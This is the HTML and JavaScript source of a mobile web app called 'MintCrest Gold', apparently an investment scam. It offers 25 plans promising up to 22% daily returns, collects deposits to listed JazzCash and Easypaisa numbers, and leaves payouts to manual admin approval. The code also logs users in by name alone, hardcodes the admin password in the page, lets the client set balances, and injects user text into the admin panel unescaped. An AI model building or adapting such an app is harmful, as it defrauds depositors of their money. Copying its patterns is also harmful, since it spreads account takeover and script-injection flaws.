<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Master Edition</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000103; color: white; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(40px); border: 1px solid rgba(255,255,255,0.08); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.15), transparent); }
        .page { display: none; animation: slideUp 0.4s cubic-bezier(0.4, 0, 0.2, 1); }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .badge-pending { background: rgba(234, 179, 8, 0.1); color: #eab308; padding: 3px 8px; border-radius: 6px; font-size: 8px; font-weight: 800; }
        .badge-approved { background: rgba(34, 197, 94, 0.1); color: #22c55e; padding: 3px 8px; border-radius: 6px; font-size: 8px; font-weight: 800; }
        .badge-rejected { background: rgba(239, 68, 68, 0.1); color: #ef4444; padding: 3px 8px; border-radius: 6px; font-size: 8px; font-weight: 800; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .animate-marquee { display: inline-block; animation: marquee 18s linear infinite; white-space: nowrap; }
        .neo-btn { transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(59, 130, 246, 0.2); }
        .neo-btn:active { transform: scale(0.95); }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div class="bg-blue-600/10 border-b border-blue-500/20 py-2.5 overflow-hidden z-[500]">
        <div class="animate-marquee text-[10px] font-black uppercase tracking-[0.2em] text-blue-400">
            💎 Welcome <span class="text-white" id="ticker-user">Guest</span>! • 25 New Investment Fleets Activated • Official WhatsApp: chat.whatsapp.com/EbfTbr66JQLFEmjnxrReE3 • Trade Securely with MintCrest Gold 💎
        </div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#000103] flex items-center justify-center p-8 text-center">
        <div class="w-full max-w-sm">
            <h1 onclick="adminTap()" class="text-6xl font-black italic tracking-tighter mb-2 cursor-pointer uppercase">MINT<span class="text-blue-500">CREST</span></h1>
            <p class="text-gray-500 text-[9px] uppercase tracking-[0.5em] mb-12 font-bold italic">Global Asset Protection</p>
            <div class="glass p-10 rounded-[3.5rem] border-t-2 border-blue-600 shadow-2xl">
                <input type="text" id="user-name" placeholder="Legal Name" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-5 focus:border-blue-500 text-white uppercase transition-all">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[11px] uppercase tracking-widest neo-btn">Initialize Vault</button>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-36">
        
        <div id="p-home" class="page active-page p-6">
            <div class="flex justify-between items-center mb-8 px-2">
                <div>
                    <p class="text-[9px] text-gray-500 uppercase font-black tracking-widest">Verified Account</p>
                    <h3 class="text-lg font-black text-white" id="u-display-name">USER</h3>
                </div>
                <div class="text-right">
                    <span class="bg-blue-600/20 text-blue-400 text-[8px] font-black px-4 py-1.5 rounded-full border border-blue-500/20 uppercase italic">VIP Tier 1</span>
                </div>
            </div>

            <div class="glass p-10 rounded-[3.5rem] mb-8 border-l-[10px] border-blue-600 shadow-2xl relative overflow-hidden">
                <div class="absolute top-0 right-0 p-6 opacity-10 text-5xl">🏦</div>
                <p class="text-[10px] text-blue-400 font-extrabold mb-1 uppercase tracking-widest">Total Net Worth</p>
                <h2 class="text-5xl font-black tracking-tighter mb-6" id="v-bal">₨ 0</h2>
                
                <div class="grid grid-cols-2 gap-3 mb-6">
                    <div class="bg-white/5 p-4 rounded-2xl">
                        <p class="text-[7px] text-gray-500 uppercase font-bold">Accumulated Profit</p>
                        <p class="text-sm font-black text-green-400" id="v-profit">₨ 0</p>
                    </div>
                    <div class="bg-white/5 p-4 rounded-2xl">
                        <p class="text-[7px] text-gray-500 uppercase font-bold">Active Node</p>
                        <p class="text-[8px] font-black text-blue-400 uppercase truncate" id="tier-tag">None</p>
                    </div>
                </div>

                <div class="text-center pt-4 border-t border-white/5">
                    <p class="text-[8px] text-gray-500 uppercase font-black mb-1">Next Profit Distribution</p>
                    <div id="countdown-display" class="text-xl font-black text-yellow-500 tracking-[0.1em]">00:00:00</div>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-5">
                <button onclick="changePage('wallet')" class="glass p-10 rounded-[3rem] text-center neo-btn">📥 <span class="text-[10px] font-black block mt-3 uppercase tracking-wider">Deposit</span></button>
                <button onclick="changePage('withdraw')" class="glass p-10 rounded-[3rem] text-center neo-btn">📤 <span class="text-[10px] font-black block mt-3 uppercase tracking-wider">Withdraw</span></button>
            </div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-center font-black italic mb-8 uppercase text-blue-500 text-2xl tracking-tighter">Trading Fleets</h2>
            <div id="plans-list" class="grid grid-cols-1 gap-4 pb-20"></div>
        </div>

        <div id="p-activity" class="page p-6">
            <h2 class="text-center font-black italic mb-10 uppercase text-blue-400">Transaction History</h2>
            <div id="user-history" class="space-y-3 pb-10"></div>
        </div>

        <div id="p-more" class="page p-6 space-y-6 pb-20">
            <div class="glass p-8 rounded-[3rem] text-center border-b-4 border-green-600 shadow-lg">
                <h3 class="text-green-500 font-black text-[12px] uppercase mb-4 italic">Official Community</h3>
                <a href="https://chat.whatsapp.com/EbfTbr66JQLFEmjnxrReE3?mode=hqctcla" class="w-full bg-green-600 py-4 rounded-2xl font-black text-[10px] uppercase tracking-widest flex items-center justify-center gap-2">
                    <span>Join WhatsApp Group</span>
                </a>
            </div>

            <div class="glass p-10 rounded-[3rem] text-center border-t-4 border-yellow-500">
                <h3 class="text-yellow-500 font-black text-[12px] uppercase mb-4 italic">Global Lucky Spin</h3>
                <div class="text-5xl mb-6">🎡</div>
                <button id="spin-btn" onclick="requestSpin()" class="bg-yellow-600 px-12 py-4 rounded-2xl font-black text-[10px] uppercase tracking-widest neo-btn disabled:opacity-30">Spin for Bonus</button>
                <p class="text-[7px] text-gray-500 mt-4 uppercase font-bold">Spin rewards are verified by Admin manually</p>
            </div>

            <div class="glass p-8 rounded-[3rem]">
                <h3 class="text-blue-500 font-black text-[11px] uppercase mb-4 italic text-center">Support Center</h3>
                <textarea id="support-msg" placeholder="Tell us your issue..." class="w-full bg-white/5 p-5 rounded-2xl text-[11px] border border-white/10 outline-none mb-4 h-28 font-bold text-white focus:border-blue-500 transition-all"></textarea>
                <button onclick="sendSupport()" class="w-full bg-blue-600 py-4 rounded-2xl font-black text-[10px] uppercase tracking-widest neo-btn">Submit Ticket</button>
            </div>

            <button onclick="logout()" class="w-full glass p-6 rounded-[2.5rem] text-center text-[11px] font-black text-red-500 uppercase tracking-widest">Logout Session</button>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] border-t-8 border-blue-600 shadow-2xl">
                <h3 class="font-black text-blue-500 mb-8 uppercase text-sm italic text-center tracking-widest">Add Funds</h3>
                <div class="space-y-3 mb-10 text-[11px] font-black uppercase">
                    <div class="flex justify-between p-4 bg-white/5 rounded-2xl border border-white/5"><span>JazzCash</span><span class="text-blue-400">03705519562</span></div>
                    <div class="flex justify-between p-4 bg-white/5 rounded-2xl border border-white/5"><span>Easypaisa</span><span class="text-green-400">03379827882</span></div>
                </div>
                <input type="number" id="dep-amount" placeholder="Deposit Amount" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-bold border border-white/5 text-white outline-none focus:border-blue-500">
                <input type="text" id="dep-trx" placeholder="Transaction ID (TID)" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-bold uppercase border border-white/5 text-white outline-none focus:border-blue-500">
                <input type="text" id="dep-promo" placeholder="PROMO CODE (Optional)" class="w-full bg-blue-600/10 p-5 rounded-2xl mb-10 text-center text-[10px] font-bold uppercase border border-blue-500/20 text-blue-400 outline-none">
                <button onclick="submitDeposit()" class="w-full bg-blue-600 py-6 rounded-2xl font-black text-[11px] uppercase tracking-widest neo-btn">Confirm Transaction</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] border-t-8 border-red-600 shadow-2xl">
                <h3 class="font-black text-red-500 mb-8 uppercase text-sm italic text-center tracking-widest">Withdrawal</h3>
                <input type="number" id="wd-amt" placeholder="Payout Amount" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-bold border border-white/5 text-white outline-none focus:border-red-500">
                <input type="text" id="wd-acc" placeholder="Full Account Info" class="w-full bg-white/5 p-5 rounded-2xl mb-10 text-center text-[10px] font-bold border border-white/5 text-white outline-none focus:border-red-500">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-6 rounded-2xl font-black text-[11px] uppercase tracking-widest neo-btn">Verify Payout</button>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#000103] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10">
            <h2 class="text-2xl font-black text-blue-500 uppercase italic">Admin Console</h2>
            <button onclick="closeAdmin()" class="bg-red-500/20 text-red-500 px-6 py-2 rounded-xl text-[10px] font-black uppercase tracking-widest">Exit</button>
        </div>
        
        <div class="grid grid-cols-2 gap-5 mb-10">
            <div class="glass p-6 rounded-3xl text-center"><p class="text-[8px] font-black uppercase text-gray-500 mb-2">Total Fleet Users</p><h4 id="adm-total-users" class="text-2xl font-black">0</h4></div>
            <div class="glass p-6 rounded-3xl text-center"><p class="text-[8px] font-black uppercase text-yellow-500 mb-2">Awaiting Action</p><h4 id="adm-pending-count" class="text-2xl font-black text-yellow-500">0</h4></div>
        </div>

        <div id="adm-sec-requests" class="space-y-4 pb-20"></div>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/5 p-8 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[4rem]">
        <button onclick="changePage('home')" id="n-home" class="active-tab text-2xl">🏠</button>
        <button onclick="changePage('invest')" id="n-invest" class="text-2xl">📈</button>
        <button onclick="changePage('activity')" id="n-activity" class="text-2xl">📜</button>
        <button onclick="changePage('more')" id="n-more" class="text-2xl">🏢</button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;

        // 25 DETAILED FINAL PLANS
        const plans = [
            {n:"Basic-X 1", p:200, r:3, d:30}, {n:"Basic-X 2", p:500, r:3.2, d:30}, {n:"Basic-X 3", p:800, r:3.4, d:30},
            {n:"Bronze-X 1", p:1000, r:3.6, d:30}, {n:"Bronze-X 2", p:2000, r:3.8, d:30}, {n:"Bronze-X 3", p:3000, r:4, d:30},
            {n:"Silver-X 1", p:5000, r:4.2, d:45}, {n:"Silver-X 2", p:7000, r:4.5, d:45}, {n:"Silver-X 3", p:10000, r:5, d:45},
            {n:"Gold-X 1", p:15000, r:5.5, d:60}, {n:"Gold-X 2", p:20000, r:6, d:60}, {n:"Gold-X 3", p:25000, r:6.5, d:60},
            {n:"Platinum-X 1", p:30000, r:7, d:75}, {n:"Platinum-X 2", p:40000, r:7.5, d:75}, {n:"Platinum-X 3", p:50000, r:8, d:90},
            {n:"Elite-X 1", p:60000, r:8.5, d:90}, {n:"Elite-X 2", p:75000, r:9, d:90}, {n:"Elite-X 3", p:100000, r:10, d:120},
            {n:"Master-X 1", p:150000, r:11, d:120}, {n:"Master-X 2", p:200000, r:12, d:150},
            {n:"👑 CROWN KING", p:25000, r:22, d:15}, {n:"🔥 FLASH NODE", p:10000, r:15, d:7}, 
            {n:"💎 VIP VAULT", p:100000, r:18, d:30}, {n:"🚀 MARS NODE", p:50000, r:12, d:20}, {n:"⚡ LIGHTNING", p:5000, r:10, d:5}
        ];

        window.onload = () => { 
            const saved = localStorage.getItem('mc_user'); if(saved) { document.getElementById('user-name').value = saved; login(); }
            setInterval(updateCountdown, 1000);
        };

        async function login() {
            const name = document.getElementById('user-name').value.trim().toUpperCase(); if(!name) return;
            localStorage.setItem('mc_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, lastSpin: 0, activeTier: 0, tierROI: 0, tierExpiry: 0, lastReqTime: Date.now(), tierName: "Inactive" });
            startSync(name);
            document.getElementById('u-display-name').innerText = name;
            document.getElementById('ticker-user').innerText = name;
            document.getElementById('auth-ui').classList.add('hidden'); document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans();
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { if(doc.exists) { user = doc.data(); updateUI(); checkProfitAuto(); } });
            db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = '';
                let items = []; snap.forEach(doc => items.push(doc.data())); items.sort((a,b) => b.time - a.time);
                items.forEach(d => { list.innerHTML += `<div class="glass p-5 rounded-3xl flex justify-between items-center mb-2 text-[10px] font-black uppercase"><div>${d.type}<br><span class="opacity-30 text-[7px]">${d.promo||d.msg||''}</span></div><div>₨ ${d.amount}<br><span class="badge-${d.status}">${d.status}</span></div></div>`; });
            });
        }

        function updateUI() {
            document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString();
            document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString();
            document.getElementById('tier-tag').innerText = user.tierName;
            const sBtn = document.getElementById('spin-btn');
            if(Date.now() - (user.lastSpin || 0) < 86400000) { sBtn.disabled = true; sBtn.innerText = "LOCKED"; } else { sBtn.disabled = false; sBtn.innerText = "SPIN NOW"; }
        }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => {
                const total = (p.p * p.r / 100) * p.d;
                list.innerHTML += `<div onclick="buy(${p.p}, ${p.r}, ${p.d}, '${p.n}')" class="glass p-6 rounded-[2.5rem] flex justify-between items-center active:scale-95 mb-1 border-l-4 border-blue-500/30"><div><h4 class="font-black text-[11px] uppercase text-blue-400">${p.n}</h4><p class="text-[8px] text-gray-500 font-bold uppercase">${p.r}% Daily • ${p.d} Days</p><p class="text-[7px] text-green-500 font-bold uppercase italic">Total Return: ₨ ${total.toLocaleString()}</p></div><p class="font-black text-[14px]">₨ ${p.p.toLocaleString()}</p></div>`;
            });
        }

        async function buy(p, roi, d, n) {
            if(user.balance < p) return alert("Insufficient Capital!");
            if(confirm(`Initialize ${n} Fleet?`)) {
                const exp = Date.now() + (d * 86400000);
                await db.collection("users").doc(user.name).update({ balance: user.balance - p, activeTier: p, tierROI: roi, tierName: n, tierExpiry: exp, lastReqTime: Date.now() });
                alert("Fleet Activation Successful!");
            }
        }

        async function requestSpin() {
            await db.collection("requests").add({ user: user.name, amount: 0, type: "Spin Request", status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ lastSpin: Date.now() });
            alert("Requested! Admin will add your reward.");
        }

        async function submitDeposit() {
            const a = document.getElementById('dep-amount').value, t = document.getElementById('dep-trx').value, p = document.getElementById('dep-promo').value;
            if(!a || !t) return alert("Details Required!");
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, promo: p||"None", type: "Deposit", status: "pending", time: Date.now() });
            alert("Deposit Submitted! Awaiting Master Approval."); changePage('activity');
        }

        async function submitWithdraw() {
            const a = document.getElementById('wd-amt').value, acc = document.getElementById('wd-acc').value;
            if(!a || !acc || a > user.balance) return alert("Capital Mismatch!");
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), acc: acc, type: "Withdraw", status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ balance: user.balance - parseInt(a) });
            alert("Withdrawal Logged!");
        }

        async function sendSupport() {
            const m = document.getElementById('support-msg').value; if(!m) return;
            await db.collection("requests").add({ user: user.name, amount: 0, type: "Support", msg: m, status: "pending", time: Date.now() });
            alert("Ticket Dispatched!"); document.getElementById('support-msg').value = '';
        }

   function updateCountdown() {
            if (user && user.activeTier > 0) {
                const diff = (user.lastReqTime + 86400000) - Date.now();
                if(diff > 0) {
                    const h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
                    document.getElementById('countdown-display').innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
                } else document.getElementById('countdown-display').innerText = "CALCULATING...";
            }
        }

        async function checkProfitAuto() {
            if (user.activeTier > 0 && (Date.now() - user.lastReqTime) >= 86400000 && Date.now() < user.tierExpiry) {
                const amt = (user.activeTier * user.tierROI) / 100;
                await db.collection("requests").add({ user: user.name, amount: amt, type: "Daily Profit", status: "pending", time: Date.now() });
                await db.collection("users").doc(user.name).update({ lastReqTime: Date.now() });
            }
        }

        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page'); }
        function adminTap() { tapCount++; if(tapCount >= 5) { if(prompt("Master Key:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function logout() { localStorage.removeItem('mc_user'); location.reload(); }

        function syncAdmin() {
            db.collection("users").onSnapshot(snap => { document.getElementById('adm-total-users').innerText = snap.size; });
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                document.getElementById('adm-pending-count').innerText = snap.size;
                const list = document.getElementById('adm-sec-requests'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); 
                    list.innerHTML += `<div class="glass p-5 flex justify-between items-center text-[9px] font-black mb-3 uppercase"><div>User: ${d.user}<br>Type: ${d.type}<br>Val: ${d.amount||d.promo||d.msg}</div><div class="flex gap-2"><button onclick="handle('${doc.id}','${d.user}',${d.amount},'approved','${d.type}')" class="bg-green-600 px-4 py-2 rounded-xl">OK</button><button onclick="handle('${doc.id}','${d.user}',${d.amount},'rejected','${d.type}')" class="bg-red-600 px-4 py-2 rounded-xl">NO</button></div></div>`;
                });
            });
        }

        async function handle(id, u, amt, act, type) {
            let val = amt;
            if(act === 'approved' && (type.includes("Spin") || (type === "Deposit" && amt === 0) || type.includes("Promo") || type.includes("Support"))) {
                val = parseInt(prompt("Amount to add/verify:", "100"));
            }
            const ref = db.collection("users").doc(u); const doc = await ref.get();
            if(act === 'approved') await ref.update({ balance: (doc.data().balance||0) + val });
            else if (type === 'Withdraw') await ref.update({ balance: (doc.data().balance||0) + amt });
            await db.collection("requests").doc(id).update({ status: act, amount: val });
            alert("Action Recorded!");
        }
    </script>
</body>
</html>
